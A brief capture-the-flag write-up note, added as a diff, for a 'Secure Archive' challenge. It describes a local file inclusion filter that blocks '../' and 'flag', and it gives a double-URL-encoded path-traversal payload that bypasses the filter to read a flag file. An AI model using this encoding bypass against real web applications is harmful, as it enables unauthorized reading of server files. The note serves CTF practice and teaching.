@@ -1,0 +1,17 @@
+CBCTF Qualifying - Secure Archive
+
+LFI with Double Encoding
+
+Blocked parameters:
+../
+flag
+..\ 
+
+Single URL decoding will be decoded and flagged
+Double URL decoding will not be flagged
+
+check robots.txt to find the flag.txt folder
+
+https://safearchive.cyberbattle.info/view?template=../secret_data/flag&format=txt
+
+https://safearchive.cyberbattle.info/view?template=%252E%252E%252F%2573%2565%2563%2572%2565%2574%255F%2564%2561%2574%2561%252F%2566%256C%2561%2567&format=txt
